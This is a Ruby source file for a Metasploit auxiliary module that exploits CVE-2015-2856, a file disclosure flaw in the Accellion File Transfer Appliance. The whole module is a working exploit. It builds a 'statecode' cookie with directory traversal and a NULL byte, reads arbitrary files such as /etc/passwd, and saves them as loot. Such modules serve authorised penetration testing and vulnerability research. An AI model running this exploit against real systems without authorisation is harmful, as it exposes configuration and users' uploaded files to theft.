##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "Accellion FTA 'statecode' Cookie Arbitrary File Read",
      'Description'    => %q{
          This module exploits a file disclosure vulnerability in the Accellion
        File Transfer appliance. This vulnerability is triggered when a user-provided
        'statecode' cookie parameter is appended to a file path that is processed as
        a HTML template. By prepending this cookie with directory traversal sequence
        and appending a NULL byte, any file readable by the web user can be exposed.
        The web user has read access to a number of sensitive files, including the
        system configuration and files uploaded to the appliance by users.
        This issue was confirmed on version FTA_9_11_200, but may apply to previous
        versions as well. This issue was fixed in software update FTA_9_11_210.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://r-7.co/R7-2015-08'],
          ['CVE', '2015-2856']
        ],
      'DisclosureDate' => 'Jul 10 2015'
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('TARGETURI', [true, 'The URI to request that triggers a call to template()', '/courier/intermediate_login.html']),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
      ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => datastore['TARGETURI'],
      'cookie' => 'statecode=../../../../..' + datastore['FILEPATH'] + '%00',
    })

    return if not res

    if res.code != 200
      vprint_status("#{peer} Unexpected response code: #{res.code} #{res.message}")
      return
    end

    contents = res.body.to_s

    # Check for patched versions of the FTA
    if contents =~ / Missing session ID.*Accellion, Inc/m
      print_error("#{peer} Appears to be a patched Accellion FTA")
      return
    end

    fname = ::File.basename(datastore['FILEPATH'])

    expected_server  = "Apache"
    expected_expires = 'Mon, 26 Jul 1997 05:00:00 GMT'

    # Use hints from the server headers to indicate whether we think this was a valid response
    if res.headers['Server'].to_s == expected_server && res.headers['Expires'].to_s == expected_expires
      path = store_loot(
        'accellion.fta.file',
        'application/octet-stream',
        rhost,
        res.body,
        fname
      )
      print_good("#{peer} Sucessfully downloaded #{datastore['FILEPATH']} as #{path}")
    else
      vprint_status(
        "#{peer} Unexpected response headers: (Server=#{res.headers['Server'].inspect} Expected=#{expected_server.inspect}) " +
        "(Expires=#{res.headers['Expires'].inspect} Expected=#{expected_expires.inspect})"
      )
    end
  end
end
